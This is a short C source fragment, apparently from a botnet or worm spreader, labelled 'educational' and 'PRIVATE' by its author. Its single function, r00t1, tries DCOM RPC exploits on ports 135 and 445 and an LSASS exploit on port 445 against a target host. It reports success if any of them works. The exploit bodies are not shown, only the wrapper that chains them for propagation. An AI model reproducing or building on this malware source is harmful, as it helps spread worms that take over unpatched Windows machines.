/**************************************************************
 *   Experiment code by Depth45. For educational use only!    *
 *                    Dcom + Lsass                            *
 *                       PRIVATE                              *
 **************************************************************/



#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DCOM
#ifndef NO_DEPTH2
#ifndef NO_LSASS

bool r00t1(EXINFO exinfo) {
	exinfo.port = 135; bool bDCOM135 = dcom(exinfo);
	exinfo.port = 445; bool bDCOM445 = dcom(exinfo);
	exinfo.port = 445; bool bLSASS = lsass(exinfo);
	return (bDCOM135 || bDCOM445 || bLSASS)?(true):(false);
}

#endif
#endif
#endif